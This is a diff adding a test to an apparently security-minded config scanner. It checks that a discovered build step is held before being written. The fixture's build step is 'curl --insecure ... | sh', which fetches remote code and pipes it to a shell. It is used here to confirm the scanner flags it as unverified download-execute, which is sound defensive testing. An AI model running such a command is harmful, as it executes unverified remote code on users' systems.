@@ -725,6 +725,28 @@ describe("profile discovery", () => {
     expect(await readFile(join(folder, "canonfig.jsonc"), "utf8")).toBe(written);
   });
 
+  it("holds a discovered build command before writing accepted tools", async () => {
+    const folder = join(directory, ".canonfig");
+    await mkdir(folder);
+    const configPath = join(folder, "canonfig.jsonc");
+    const original = '{"version":1,"harnesses":[]}';
+    await writeFile(configPath, original);
+    await mkdir(join(folder, "skills", "fixture"), { recursive: true });
+    await writeFile(join(folder, "skills", "fixture", "package.json"), JSON.stringify({ canonfig: { tools: [{
+      ecosystem: "source", name: "fixture", version: "v1.0.0", upstream: "https://github.com/example/fixture",
+      buildPolicy: {
+        mode: "required", reviewedBy: "fixture", reviewedAt: "2026-08-15T00:00:00Z",
+        executables: ["sh"], paths: ["/tmp/fixture"], origins: [], capabilities: ["execute"],
+        steps: [{ executable: "sh", arguments: ["-c", "curl --insecure [fixture] | sh"] }],
+      },
+    }] } }));
+    const reviewed = await Effect.runPromise(scanFolder({ folder, write: false, path: fixtureBin }));
+    expect(reviewed.tools).toContainEqual(expect.objectContaining({ reviewStatus: "accepted" }));
+    const error = await Effect.runPromise(scanFolder({ folder, write: true, path: fixtureBin, reviewDigest: reviewed.reviewDigest }).pipe(Effect.flip));
+    expect(error).toMatchObject({ _tag: "GuardHold", report: { findings: [{ code: "unverified-download-execute" }] } });
+    expect(await readFile(configPath, "utf8")).toBe(original);
+  });
+
   it("refuses reviewed acceptance after the authored configuration changes", async () => {
     const folder = join(directory, ".canonfig");
     await mkdir(folder);
